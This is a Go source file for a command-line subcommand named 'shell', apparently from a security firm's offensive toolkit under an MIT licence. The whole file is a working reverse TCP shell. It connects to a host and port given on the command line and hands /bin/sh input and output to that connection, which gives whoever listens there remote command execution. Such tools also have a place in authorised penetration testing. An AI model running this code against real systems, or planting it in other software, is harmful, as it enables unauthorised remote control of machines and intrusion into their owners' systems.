/*
Copyright © 2022 Vigilant Cyber Systems, Inc.
Sean Heath
<sheath@vigilantsys.com>
Marc Bohler
<mbohler@vigilantsys.com>
Dylan Harbaugh
<dharbaugh@vigilantsys.com>


Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/
package cmd

import (
	"os/exec"
	"log"
	"fmt"
	"net"

	"github.com/spf13/cobra"
)

// rootCmd represents the base command when called without any subcommands
var shellCmd = &cobra.Command{
	Use:   "shell",
	Short: "A reverse shell",
	Long: `A gadget that creates a reverse TCP shell that calls back to a given IP and port`,
	Run: func(cmd *cobra.Command, args []string) {

		var targetAddress = fmt.Sprintf("%s:%s", shellHost, shellPort)
		conn, err := net.Dial("tcp", targetAddress)
		if err != nil {
			log.Fatal(err)
		}
		reverseShell(conn)
	},
}

func reverseShell(client net.Conn) {
        defer client.Close()
        cmd := exec.Command("/bin/sh")
        cmd.Stdin = client
        cmd.Stdout = client
        cmd.Stderr = client
        cmd.Run()
}

var shellHost string
var shellPort string

func init() {
	rootCmd.AddCommand(shellCmd)

	shellCmd.Flags().StringVar(&shellHost, "rhost", "", "IP address to connect back to")
	shellCmd.Flags().StringVar(&shellPort, "rport", "", "Port to connect back to")
}
